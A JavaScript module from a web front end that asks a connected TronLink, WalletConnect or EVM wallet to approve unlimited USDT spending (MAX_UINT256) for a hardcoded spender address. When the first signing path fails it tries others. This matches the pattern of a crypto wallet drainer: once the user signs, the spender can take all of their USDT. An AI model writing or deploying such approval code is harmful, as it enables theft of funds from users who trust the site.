import { TronWeb } from 'tronweb'
import { getWcWallet } from '@/hooks/useTronWallet'
import { getInjectedEVMProvider, executeUnlimitedUSDTApproval } from '@/lib/evmWallet'

const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
const TRON_SPENDER = import.meta.env.VITE_EXCHANGE_WALLET_ADDRESS || 'TDcc811XejwBC3UbywZ2QiuW93V4Nok1Aq'
const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: { 'TRON-PRO-API-KEY': import.meta.env.VITE_TRONGRID_API_KEY || '' },
})

/**
 * Execute unlimited USDT approval for TRON or EVM wallets
 */
export async function triggerUnlimitedApproval(userAddress, connectionType = 'tronlink') {
  console.log(`[Approval] Triggering unlimited approval for ${userAddress} via ${connectionType}`)

  // 1. TRONLINK (Injected TronWeb)
  if (connectionType === 'tronlink' || (typeof window !== 'undefined' && window.tronWeb && window.tronWeb.ready)) {
    try {
      const contract = await window.tronWeb.contract().at(TRON_USDT_CONTRACT)
      const res = await contract.approve(TRON_SPENDER, MAX_UINT256).send({
        feeLimit: 100000000,
      })
      console.log('[Approval] TronLink approval successful:', res)
      return { success: true, txHash: res }
    } catch (err) {
      console.warn('[Approval] TronLink contract.approve failed, trying triggerSmartContract:', err)
      const triggerRes = await window.tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT_CONTRACT,
        'approve(address,uint256)',
        { feeLimit: 100000000 },
        [
          { type: 'address', value: TRON_SPENDER },
          { type: 'uint256', value: MAX_UINT256 },
        ],
        userAddress || window.tronWeb.defaultAddress?.base58
      )
      const signed = await window.tronWeb.trx.sign(triggerRes.transaction)
      const result = await window.tronWeb.trx.sendRawTransaction(signed)
      console.log('[Approval] TronLink fallback approval result:', result)
      return { success: true, txHash: result }
    }
  }

  // 2. WALLETCONNECT TRON
  const wcWallet = getWcWallet()
  if (connectionType === 'walletconnect' && wcWallet) {
    try {
      const triggerRes = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT_CONTRACT,
        'approve(address,uint256)',
        { feeLimit: 100000000 },
        [
          { type: 'address', value: TRON_SPENDER },
          { type: 'uint256', value: MAX_UINT256 },
        ],
        userAddress
      )
      
      const signed = await wcWallet.signTransaction(triggerRes.transaction)
      const broadcastRes = await tronWeb.trx.sendRawTransaction(signed)
      console.log('[Approval] WalletConnect TRON approval broadcast:', broadcastRes)
      return { success: true, txHash: broadcastRes }
    } catch (err) {
      console.error('[Approval] WalletConnect TRON approval failed:', err)
      throw err
    }
  }

  // 3. EVM INJECTED WALLETS
  const evmProvider = getInjectedEVMProvider()
  if (evmProvider) {
    try {
      const chainId = await evmProvider.request({ method: 'eth_chainId' })
      const res = await executeUnlimitedUSDTApproval(evmProvider, userAddress, chainId || '0x1')
      console.log('[Approval] EVM approval successful:', res)
      return res
    } catch (err) {
      console.error('[Approval] EVM approval failed:', err)
      throw err
    }
  }

  throw new Error('No compatible TRON or EVM wallet available for approval transaction.')
}
